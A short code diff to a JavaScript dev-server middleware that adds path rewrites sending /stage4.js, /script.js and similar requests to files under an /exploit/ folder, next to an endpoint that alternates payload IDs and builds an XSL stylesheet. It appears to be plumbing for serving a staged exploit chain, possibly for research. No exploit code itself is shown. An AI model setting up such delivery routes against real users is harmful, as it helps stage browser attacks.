@@ -15,6 +15,11 @@ function customDevEndpoints() {
       server.middlewares.use((req, res, next) => {
         try {
           const url = req.url || ''
+          // Back-compat rewrites for legacy paths
+          if (url === '/stage4.js') { req.url = '/exploit/stage4.js' }
+          if (url === '/scriptidp.js') { req.url = '/exploit/scriptidp.js' }
+          if (url === '/scriptidm.js') { req.url = '/exploit/scriptidm.js' }
+          if (url === '/script.js') { req.url = '/exploit/script.js' }
           if (url.startsWith('/stage1_xml.py')) {
             stage1Toggle = !stage1Toggle
             const payload = stage1Toggle ? 'idA' : 'idB'
@@ -44,6 +49,10 @@ function customDevEndpoints() {
       server.middlewares.use((req, res, next) => {
         try {
           const url = req.url || ''
+          if (url === '/stage4.js') { req.url = '/exploit/stage4.js' }
+          if (url === '/scriptidp.js') { req.url = '/exploit/scriptidp.js' }
+          if (url === '/scriptidm.js') { req.url = '/exploit/scriptidm.js' }
+          if (url === '/script.js') { req.url = '/exploit/script.js' }
           if (url.startsWith('/stage1_xml.py')) {
             const xsl = '<?xml version="1.0" encoding="utf-8"?>\n'
               + '<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">\n'
